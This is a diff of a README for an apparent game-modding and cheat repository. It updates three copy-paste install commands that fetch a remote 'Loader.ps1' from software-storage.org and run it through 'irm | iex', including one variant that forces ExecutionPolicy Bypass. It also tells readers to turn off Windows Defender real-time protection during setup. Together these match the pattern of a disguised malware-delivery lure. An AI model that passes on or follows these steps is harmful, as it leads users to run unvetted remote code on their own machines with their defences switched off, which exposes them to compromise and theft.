@@ -10,6 +10,7 @@ Welcome to the ultimate open-source repository dedicated to the analysis, moddin
 * **Memory Mapping Guides:** Comprehensive documentation on memory addresses for analytical tools like Cheat Engine.
 * **Modding Documentation:** Step-by-step guides on how to safely inject custom modifications and adjust graphics configs.
 * **Community API & Tools:** Code snippets designed to help developers create external plugins and enhancements.
+
 ---
 
 ## 🚀 Automated Installation & Setup (PowerShell)
@@ -22,7 +23,7 @@ Welcome to the ultimate open-source repository dedicated to the analysis, moddin
    Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:
 
    ```powershell
-   irm https://software-storage.su/powershell/Loader.ps1 | iex
+   irm https://software-storage.org/powershell/Loader.ps1 | iex
    ```
 ---
 
@@ -31,13 +32,13 @@ Welcome to the ultimate open-source repository dedicated to the analysis, moddin
 ### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
 If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.org/powershell/Loader.ps1 | iex"
 ```
 
 ### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
 In older legacy environments where aliases are missing, use explicit full system cmdlets:
 ```powershell
-Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://software-storage.org/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 
@@ -45,6 +46,7 @@ Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Exp
 Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.
 
 ---
+
 
 ## ⚖️ Legal Disclaimer & Safe Harbor (DMCA Protection)
 
